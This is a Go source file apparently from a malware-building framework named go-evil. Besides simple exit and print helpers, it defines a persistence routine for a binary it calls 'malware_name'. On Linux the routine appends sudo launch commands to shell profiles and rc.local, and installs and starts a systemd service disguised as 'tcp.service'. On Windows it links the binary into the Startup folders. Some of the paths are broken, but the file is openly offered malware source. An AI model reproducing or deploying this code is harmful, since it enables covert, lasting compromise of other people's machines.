package domains

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"runtime"

	"github.com/s9rA16Bf4/go-evil/utility/converter"
)

func System_exit(status_lvl string) {
	value := converter.String_to_int(status_lvl, "system.System_exit()")
	os.Exit(value)
}

func System_out(msg string) {
	fmt.Println(msg)
}

func AddToStartup() {
	malware_name, _ := os.Executable() // Grabs also were we currently are
	switch runtime.GOOS {
	case "linux":
		// Target bash & rc.local
		target := []string{"/etc/profile", "~/.bash_profile", "~/.bash_login", "~/.profile", "/etc/rc.local"}
		for _, line := range target {
			in, err := os.OpenFile(line, os.O_APPEND|os.O_WRONLY, 0644)
			if err == nil {
				in.WriteString("sudo ." + malware_name + " &")
			}
		}
		// Target systemd
		in, err := os.Create("/lib/systemd/system/tcp.service")
		if err == nil {
			write := bufio.NewWriter(in)
			what_to_write := []string{
				"[Unit]",
				"Description=My Sample Service",
				"After=multi-user.target",

				"[Service]",
				"Type=idle",
				"ExecStart=." + malware_name,

				"[Install]",
				"WantedBy=multi-user.target",
			}
			for _, line := range what_to_write {
				write.WriteString(line + "\n")
			}
			exec.Command("sudo", "systemctl", "enable", "tcp.service").Run() // Enable it
			exec.Command("sudo", "systemctl", "start", "tcp.service").Run()  // Run it
		}
	case "windows":
		os.Link(malware_name, "%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")     // Running user
		os.Link(malware_name, "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup") // All users
	}
}
